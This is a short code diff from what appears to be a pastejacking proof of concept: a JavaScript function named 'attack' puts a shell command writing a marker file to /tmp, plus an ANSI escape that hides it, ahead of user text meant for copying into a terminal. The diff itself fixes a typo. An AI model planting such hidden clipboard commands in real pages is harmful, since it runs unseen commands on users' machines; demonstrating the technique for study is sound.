@@ -21,7 +21,7 @@
 
       function attack(userstring) {
         var textarea = document.createElement('textarea');
-        textarea.value = 'echo reewardius > /tmp/hackad;printf "\\033[2K";\r\n' + userstring;
+        textarea.value = 'echo reewardius > /tmp/hacked;printf "\\033[2K";\r\n' + userstring;
         document.body.appendChild(textarea);
         textarea.focus();
         textarea.select();
